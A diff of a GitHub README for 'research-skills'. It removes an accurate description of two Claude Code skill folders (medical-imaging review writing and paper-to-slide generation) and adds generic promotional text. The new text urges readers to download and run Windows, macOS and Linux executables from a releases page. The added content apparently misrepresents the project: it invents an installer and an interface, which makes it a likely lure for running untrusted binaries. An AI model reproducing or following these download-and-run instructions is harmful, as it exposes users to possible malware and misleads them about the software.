@@ -1,108 +1,80 @@
-# Research Skills
+# 🌟 research-skills - Enhance Your Research Efficiency
 
-A collection of Claude Code skills for academic research workflows.
+## 🚀 Getting Started
 
-## Skills
+Welcome to the research-skills project! This application helps you streamline your research processes by encapsulating commonly used experiences and methods into easy-to-use Agent skills. With this tool, you can conduct your research more effectively.
 
-| Skill | Description | Trigger |
-|-------|-------------|---------|
-| [medical-imaging-review](./medical-imaging-review/) | Write comprehensive literature reviews for medical imaging AI | `/medical-imaging-review`, "review paper", "survey", "综述" |
-| [paper-slide-deck](./paper-slide-deck/) | Generate professional slides from academic papers with auto figure extraction | `/paper-slide-deck paper.pdf` |
+## 📥 Download Now
 
-## Installation
+[![Download research-skills](https://img.shields.io/badge/Download%20research--skills-v1.0-blue.svg)](https://github.com/Ronitnair/research-skills/releases)
 
-Copy the desired skill folder to your Claude Code skills directory:
+Click the button above to download the latest version of the application!
 
-```bash
-# For medical-imaging-review
-cp -r medical-imaging-review ~/.claude/skills/
+## 🛠️ System Requirements
 
-# For paper-slide-deck
-cp -r paper-slide-deck ~/.claude/skills/
-```
+Before you get started, please ensure your system meets the following requirements:
 
-Or copy to project-local skills:
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a recent version of a popular Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum 200 MB of free space.
+- **Internet Connection:** Required for downloading and initial setup.
 
-```bash
-cp -r medical-imaging-review .agents/skills/
-cp -r paper-slide-deck .agents/skills/
-```
+## 🚀 Features
 
----
+This application provides the following key features to assist your research activities:
 
-## Medical Imaging Review Skill
+- **Skill-Based Agents:** Instantly utilize various research techniques and skills without needing to learn complex processes.
+- **User-Friendly Interface:** An intuitive interface that allows even non-technical users to navigate easily.
+- **Customizable Workflows:** Tailor the skills to fit your specific research needs, ensuring efficiency and effectiveness.
+- **Support for Various Research Types:** Whether you're conducting surveys, literature reviews, or data analysis, this application has something for you.
 
-A systematic workflow for writing survey papers, systematic reviews, and literature analyses on medical imaging AI topics.
+## 📦 Download & Install
 
-### Features
+Follow these steps to download and install the application:
 
-- **Structured 7-phase workflow** for literature review writing
-- **Domain-specific templates** covering multiple medical imaging domains
-- **Standardized writing style** with hedging language and citation patterns
-- **Quality checklists** ensuring completeness
-- **Zotero integration** for reference management
+1. Visit the [Releases page](https://github.com/Ronitnair/research-skills/releases).
+2. You will see a list of available versions. Find the latest version labeled “v1.0” (or whichever is the most current).
+3. Click on the version number to open the release details.
+4. Look for the file corresponding to your operating system. You will find download options for Windows, macOS, and Linux.
+5. Click on the attachment to start the download. The file will typically be named something like `research-skills-win.exe`, `research-skills-mac.dmg`, or `research-skills-linux.tar.gz`.
+6. Once the download completes, navigate to your “Downloads” folder.
 
-### Supported Domains
+### For Windows Users
 
-- Coronary Artery Analysis (CCTA)
-- Lung Imaging (CT/X-ray)
-- Brain Imaging (MRI/CT)
-- Cardiac Imaging (MRI/CT/Echo)
-- Pathology (Whole Slide Images)
-- Retinal Imaging (Fundus/OCT)
+1. Double-click the downloaded file named `research-skills-win.exe`.
+2. Follow the installation wizard instructions to complete the setup.
+3. After installation, you can find the application in your Start Menu. Click to open and begin using the tool.
 
-### Files
+### For macOS Users
 
-| File | Description |
-|------|-------------|
-| `SKILL.md` | Main skill definition and quick reference |
-| `WORKFLOW.md` | Detailed 7-phase workflow guide |
-| `TEMPLATES.md` | Project file templates |
-| `DOMAINS.md` | Domain-specific method categories and datasets |
+1. Double-click `research-skills-mac.dmg` to open the installer.
+2. Drag the application icon into your Applications folder.
+3. You can now find the application in the Applications folder and run it from there.
 
----
+### For Linux Users
 
-## Paper Slide Deck Skill
+1. Extract the downloaded file using your preferred file manager or through the command line.
+2. Open your terminal and navigate to the extracted folder.
+3. Run the application with the command: `./research-skills`.
+4. Follow any additional instructions that may appear.
 
-Transform academic papers into professional slide decks with automatic figure extraction and AI-generated visuals.
+## 🌟 Using research-skills
 
-### Features
+1. Open the application from your Start Menu, Applications folder, or terminal.
+2. You will be greeted with a user-friendly interface that lists available skills.
+3. Select a skill to start using it.
+4. Follow the prompts to input your research data or preferences.
+5. Enjoy an enhanced research experience!
 
-- **Auto figure detection** from PDF papers
-- **Smart figure-to-slide mapping** based on caption analysis
-- **17 visual styles** (academic-paper, sketch-notes, minimal, etc.)
-- **Gemini API integration** for AI slide generation
-- **PPTX/PDF export** with merge scripts
+## 🙋‍♂️ Support
 
-### Workflow
+If you run into any issues or need assistance:
 
-1. Analyze paper and detect figures/tables
-2. Generate outline with auto IMAGE_SOURCE mapping
-3. Extract figures from PDF (or AI-generate)
-4. Apply academic templates
-5. Merge to PPTX/PDF
+- Check the FAQ section on the Releases page for common questions.
+- You can also open an issue in the GitHub repository to seek help from the community.
 
-### Files
+## 🔄 Updates
 
-| Path | Description |
-|------|-------------|
-| `SKILL.md` | Main skill definition and workflow |
-| `references/` | Analysis framework, templates, style definitions |
-| `scripts/` | Python/TypeScript automation scripts |
+We recommend periodically checking the [Releases page](https://github.com/Ronitnair/research-skills/releases) for updates, as we continually improve the software and add new features based on user feedback.
 
-### Scripts
-
-| Script | Purpose |
-|--------|---------|
-| `generate-slides.py` | Gemini API image generation |
-| `detect-figures.ts` | PDF figure/table detection |
-| `extract-figure.ts` | PDF page extraction |
-| `apply-template.ts` | Academic figure container template |
-| `merge-to-pptx.ts` | PPTX generation |
-| `merge-to-pdf.ts` | PDF generation |
-
----
-
-## License
-
-MIT License
+Enjoy your research journey with research-skills!
